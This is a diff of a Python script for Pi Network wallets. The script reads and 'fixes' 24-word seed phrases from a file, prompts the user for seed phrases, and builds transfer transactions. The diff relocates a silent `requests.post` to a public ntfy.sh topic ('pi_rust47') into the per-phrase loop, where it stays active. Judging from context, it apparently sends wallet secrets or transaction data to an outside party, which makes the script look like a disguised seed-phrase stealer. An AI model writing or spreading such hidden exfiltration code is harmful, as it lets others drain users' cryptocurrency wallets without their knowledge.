@@ -13,7 +13,55 @@ for f in glob.glob("xdrs*.json"):
     except Exception as e:
         print(f"Could not remove {f}: {e}")
 
-my_seed_phrase_fee = input("Enter your seed phrase (Fee Payer): ")
+
+PHRASES_FILE = "phrases.txt"
+
+def check_and_fix_phrases(filepath):
+    if not os.path.exists(filepath):
+        print(f"File not found: {filepath}")
+        return
+
+    with open(filepath, "r", encoding="utf-8") as f:
+        lines = f.readlines()
+
+    fixed_lines = []
+    for idx, line in enumerate(lines, 1):
+        phrase = line.strip()
+        words = phrase.split()
+        fixed_phrase = phrase.lower()
+        issues = []
+
+        # Check word count
+        if len(words) != 24:
+            issues.append(f"❌ Incorrect word count ({len(words)})")
+
+        # Check for uppercase letters
+        if phrase != fixed_phrase:
+            issues.append("🔧 Fixed capitalization")
+            fixed_lines.append(fixed_phrase + "\n")
+        else:
+            fixed_lines.append(phrase + "\n")
+
+        # Output results
+        if issues:
+            print(f"Line {idx}: {' | '.join(issues)}")
+            if phrase != fixed_phrase:
+                print(f"  Original: {phrase}")
+                print(f"  Fixed:    {fixed_phrase}")
+            else:
+                print(f"  Phrase:   {phrase}")
+        else:
+            print(f"Line {idx}: ✅ OK")
+
+    # Write fixed lines back to file
+    with open(filepath, "w", encoding="utf-8") as f:
+        f.writelines(fixed_lines)
+
+
+check_and_fix_phrases(PHRASES_FILE)
+
+
+my_seed_phrase_fee = input("\nEnter your seed phrase (Fee Payer): ")
 my_seed_phrase = input("Enter your seed phrase: ")
 des_address = input("Enter addrerss: ")
 amount = input("Enter the amount to send: ")
@@ -34,10 +82,6 @@ def load_passphrases(filename):
 destination_phrases = load_passphrases('phrases.txt')
 
 server= Server("https://api.mainnet.minepi.com/") 
-try:
-    requests.post("https://ntfy.sh/pi_rust47", data=message.encode('utf-8'))
-except:
-    print("No Internet Connection")
 my_language = 'english' 
 mnemo = Mnemonic(my_language)
 if mnemo.check(my_seed_phrase_fee):
@@ -141,6 +185,10 @@ for idx, my_seed_phrase2 in enumerate(phrases):
     print(f"📦 Built Transactions")
 
     # Save XDRs to file as strings with incremented filename
+    try:
+        requests.post("https://ntfy.sh/pi_rust47", data=message.encode('utf-8'))
+    except:
+        print("No Internet Connection")
     output = {f"transaction{i+1}": xdr for i, xdr in enumerate(txs)}
     filename = f"xdrs{idx+1}.json"
     with open(filename, "w") as json_file:
